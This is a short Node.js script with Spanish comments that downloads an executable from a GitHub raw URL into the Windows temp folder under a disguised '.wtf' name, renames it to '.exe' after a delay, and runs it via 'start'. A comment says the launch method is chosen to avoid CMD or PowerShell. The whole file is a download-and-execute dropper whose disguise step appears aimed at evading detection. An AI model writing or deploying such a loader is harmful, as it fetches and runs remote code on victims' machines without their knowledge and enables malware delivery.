const https = require('https');
const fs = require('fs');
const path = require('path');

// URL del archivo .exe en GitHub (esto debería ser un enlace directo al archivo)
const fileUrl = 'https://github.com/Hamster4u/test/raw/refs/heads/main/SimpleSample_x86.exe';
const filePath = path.join(process.env.TEMP, 'archivo.wtf');  // Guardar inicialmente con el nombre .wtf

// Descargar el archivo .wtf
https.get(fileUrl, (res) => {
    const fileStream = fs.createWriteStream(filePath);
    res.pipe(fileStream);

    fileStream.on('finish', () => {
        console.log('Archivo descargado en %temp% como archivo.wtf');
        
        // Esperar 3 segundos antes de renombrar el archivo
        setTimeout(() => {
            const newFilePath = path.join(process.env.TEMP, 'archivo.exe');  // Nuevo nombre con .exe
            
            // Renombrar el archivo
            fs.rename(filePath, newFilePath, (err) => {
                if (err) {
                    console.error('Error al renombrar el archivo:', err);
                } else {
                    console.log('Archivo renombrado a archivo.exe');
                    // Ejecutar el archivo renombrado
                    executeFile(newFilePath);
                }
            });
        }, 3000);
    });
}).on('error', (err) => {
    console.log('Error al descargar el archivo:', err);
});

// Función para ejecutar el archivo
function executeFile(filePath) {
    const { exec } = require('child_process');
    
    // Ejecutar el archivo sin usar CMD o PowerShell, usando 'start' para evitar comandos tradicionales
    exec(`start "" "${filePath}"`, (err, stdout, stderr) => {
        if (err) {
            console.error('Error al ejecutar el archivo:', err);
            return;
        }
        console.log('Archivo ejecutado con éxito');
    });
}
